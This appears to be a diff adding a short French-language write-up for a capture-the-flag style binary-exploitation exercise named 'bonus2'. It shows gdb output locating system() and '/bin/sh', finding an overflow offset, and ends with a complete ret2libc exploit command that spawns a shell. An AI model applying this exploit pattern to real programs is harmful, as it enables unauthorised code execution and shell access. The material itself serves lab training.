@@ -1,0 +1,27 @@
+il faut set une valeur a LANG dans les variables d'environnement
+on a au choix fi, nl, ou autres
+
+export LANG="fi"
+
+gdb bonus2
+gdb>print system
+gdb>    $1 = {<text variable, no debug info>} 0xb7e6b060 <system>
+gdb>
+gdb>find 0xb7e6b060,+9999999,"/bin/sh"
+gdb>    0xb7f8cc58
+gdb>
+gdb>r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
+gdb>
+gdb>
+gdb>Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
+gdb>
+gdb>0x41366141 in ?? ()
+
+offset = 18
+
+on rempli l'av[1] afin que le strncpy dans le buffer ne puisse pas avoir de '\0'
+ainsi lors du strcat nous aurons une string composee de "Hyvää päivää " + 40 * A + 18 * B + adresse_system = 72
+
+les "AAAA" ecrase l'adresse de retour lors de l'appel a system, l'adresse suivante execute la commande bin/sh
+
+./bonus2 `python -c 'print "A" * 40'` `python -c 'print "B" * 18 + "\x60\xb0\xe6\xb7" + "AAAA" + "\x58\xcc\xf8\xb7"'`
